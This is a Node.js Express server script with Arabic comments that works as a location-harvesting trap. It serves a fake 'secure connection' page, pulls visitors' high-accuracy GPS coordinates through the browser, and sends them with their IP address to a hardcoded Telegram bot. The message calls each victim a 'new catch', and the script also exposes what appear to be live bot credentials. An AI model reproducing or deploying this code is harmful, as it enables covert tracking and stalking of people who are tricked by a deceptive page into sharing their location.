const express = require('express');
const axios = require('axios');
const app = express();

const BOT_TOKEN = "8524312771:AAGzkfu6ZiFBClFRDJaG4SPWl1eEZcgHEU8";
const CHAT_ID = "6315285444";

// دالة إرسال البيانات للتليجرام
async function notifyTelegram(ip, lat, lon, mode) {
    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    const message = `☢️ <b>صيد جديد من عمر مدهش!</b>\n\n` +
                    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                    `⚙️ <b>العملية:</b> ${mode}\n` +
                    `📍 <b>الموقع:</b> <a href="${mapUrl}">اضغط لفتح الخريطة</a>`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (e) { console.log("Telegram Error"); }
}

// استقبال أي طلب (حتى لو كان الرابط به أخطاء)
app.use(async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const urlParams = new URLSearchParams(req.url.split('?')[1] || req.url.split('&')[1]);
    
    const lat = req.query.lat || urlParams.get('lat');
    const lon = req.query.lon || urlParams.get('lon');
    const mode = req.query.mode || urlParams.get('mode') || "اختراق عام";

    // إذا وصلت الإحداثيات
    if (lat && lon) {
        await notifyTelegram(ip, lat, lon, mode);
        return res.send(`
            <body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;">
                <h1>[ SUCCESS ]</h1>
                <p>CONNECTION ENCRYPTED AND SECURED</p>
                <p>IP: ${ip}</p>
            </body>
        `);
    }

    // إذا لم تصل الإحداثيات، نقوم بسحبها
    res.send(`
        <html>
        <head><title>Secure Connection</title></head>
        <body style="background:#000;color:#f00;text-align:center;padding-top:100px;">
            <h1>☢ LEX-Ω SYSTEM ☢</h1>
            <p>جاري تأمين الاتصال... يرجى السماح بالوصول</p>
            <script>
                navigator.geolocation.getCurrentPosition(
                    (p) => {
                        // إعادة توجيه باستخدام ? لضمان عمل السيرفر
                        window.location.href = "/?mode=GPS_HACK&lat=" + p.coords.latitude + "&lon=" + p.coords.longitude;
                    },
                    (e) => { window.location.href = "/?mode=PERMISSION_DENIED"; },
                    {enableHighAccuracy: true}
                );
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
